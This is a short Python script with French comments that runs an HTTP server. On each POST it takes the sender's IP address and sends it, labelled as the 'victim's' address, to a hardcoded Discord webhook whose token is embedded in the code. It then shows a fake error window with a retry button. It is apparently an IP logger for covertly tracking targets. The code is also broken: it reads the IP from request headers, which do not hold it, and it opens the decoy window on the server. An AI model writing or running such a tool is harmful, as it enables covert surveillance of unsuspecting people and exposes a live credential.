import http.server
import socketserver
from urllib.parse import parse_qs
import tkinter as tk
from tkinter import messagebox
import requests

# Fonction pour récupérer l'adresse IP de l'utilisateur
def get_user_ip(environ):
    ip = environ.get('REMOTE_ADDR')
    return ip

# Fonction pour envoyer un message à Discord
def send_discord_message(webhook_url, message):
    data = {
        "content": message
    }
    response = requests.post(webhook_url, data=data)
    if response.status_code == 204:
        print("Message envoyé avec succès à Discord !")
    else:
        print("Une erreur s'est produite lors de l'envoi du message à Discord.")

# Classe pour le gestionnaire de requêtes
class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'Hello, world!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        params = parse_qs(post_data.decode('utf-8'))

        user_ip = get_user_ip(self.headers)
        message = f"𝕃'𝕒𝕕𝕣𝕖𝕤𝕤𝕖 𝕀ℙ 𝕕𝕖 𝕝𝕒 𝕧𝕚𝕔𝕥𝕚𝕞𝕖 𝕖𝕤𝕥 : {user_ip}"
        send_discord_message("https://discord.com/api/webhooks/1189581246829957180/aRFpdCSf9AgfhrzGP0F5cjWxu1lG5-hlejBf3se-7BISIbx4VRS6aD-jiiy4BwpHgqZo", message)

        # Affiche une fenêtre avec le message d'erreur et un bouton pour réessayer
        root = tk.Tk()
        root.title("Erreur")
        error_message = tk.Label(root, text="Une erreur s'est produite.")
        error_message.pack(pady=10)
        retry_button = tk.Button(root, text="Cliquez pour réessayer", command=root.destroy)
        retry_button.pack(pady=10)
        root.mainloop()

# Configurer le serveur avec le gestionnaire de requêtes
handler = MyHandler
port = 8000
httpd = socketserver.TCPServer(("", port), handler)

print(f"Serveur actif sur le port {port}")

# Lancer le serveur
httpd.serve_forever()
